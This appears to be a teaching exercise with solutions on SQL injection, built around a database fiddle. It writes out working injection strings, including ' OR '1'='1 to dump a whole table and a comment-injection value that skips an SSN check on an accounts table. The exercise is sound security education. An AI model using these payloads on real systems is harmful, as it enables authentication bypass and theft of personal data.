## SQL Substitutions


### Instructions

Navigate to the fiddle at: <https://www.db-fiddle.com/f/gAkPEQwVW7EsAnm3xuUJGx/0>

Consider the query below as you follow the instructions:

  ```sql
  SELECT * FROM warehouse.exploits WHERE name='$EXPLOIT_NAME';
  ```

Suppose that:

- A user is using a site that allows them to look up information about known exploits
- `$EXPLOIT_NAME` comes from the user-submitted search value
- The web application uses the user-submitted search value to create the SQL query it runs

So, if a user searches for `'aurora'`, the query becomes:

  ```sql
  SELECT * FROM warehouse.exploits WHERE name='aurora';
  ```

Keep this in mind as you follow the instructions below.

### "Simple" Substitutions

What value does `$EXPLOIT_NAME` need to have to generate the query below? What results does this generate in the fiddle?
  - **Solution**
    - `$EXPLOIT_NAME` = `'eternal romance'`
    - This simply retrieves the record for `eternal romance`.

      ```sql
      SELECT * FROM warehouse.exploits WHERE name='eternal romance';
      ```

What value does `$EXPLOIT_NAME` need to have to generate the query below? What results does this generate in the fiddle?
  - **Solution**
     - `$EXPLOIT_NAME` = `aurora' OR id='1'`. 
    - This returns the record for `'eternal_romance'` (with `id=1`) _and_ for `'aurora'`.

      ```sql
      SELECT * FROM warehouse.exploits WHERE name='aurora' OR id='1';
      ```

What value does `$EXPLOIT_NAME` need to have to generate the query below? What results does this generate in the fiddle?
  - **Solution**
    - `$EXPLOIT_NAME` = `' OR '1'='1`. **Note that you do _not_ need to include the final single quote!**
    - This returns _every_ row in the `warehouse.exploits` table!

      ```sql
      SELECT * FROM warehouse.exploits WHERE name='' OR '1'='1';
      ```

What value does `$EXPLOIT_NAME` need to have to generate the query below? What results does this generate in the fiddle?
  - **Solution**
    - `$EXPLOIT_NAME` = `'`. 
    - This is invalid SQL, so it throws an error.

      ```sql 
      SELECT * FROM warehouse.exploits WHERE name=''';
      ```

### "Complex" Substitutions
In addition to special characters like quotes, you can inject the comment character: `--`.

- This forces the server _not_ to run whatever SQL code follows the comment.

- Consider the query below to see when this might be useful:

  ```sql
  -- Retrieve account data for `$USERNAME`, as long as they provide the right SSN
  SELECT * FROM warehouse.accounts WHERE name='$USERNAME' AND ssn='$USER_SSN';
  ```

---

What value must `$USERNAME` have to generate the query below? What results does this generate?
  - **Solution**
    - `$USERNAME` = `jane'; -- `. The final space is important!
    - This retrieves _just_ the record for `jane`, _even if she submits the wrong SSN_. This is because the comment (`--`) causes the database to skip the `AND ssn=$USER_SSN` statement, so it doesn't perform that check at all!

      ```sql
      -- Retrieve account data for `$USERNAME`, as long as they provide the right SSN
      SELECT * FROM warehouse.accounts WHERE name='jane'; -- AND ssn='$USER_SSN';
      ```

What value must `$USERNAME` have to generate the query below? What results does this generate?
  - **Solution**
    - `$USERNAME` = `jane' OR '1'='1'; -- `. The final space is important!
    - This retrieves _all_ rows from the `accounts` table.

      ```sql
      -- Retrieve account data for `$USERNAME`, as long as they provide the right SSN
      SELECT * FROM warehouse.accounts WHERE name='jane' OR '1'='1'; -- AND ssn='$USER_SSN';
      ```
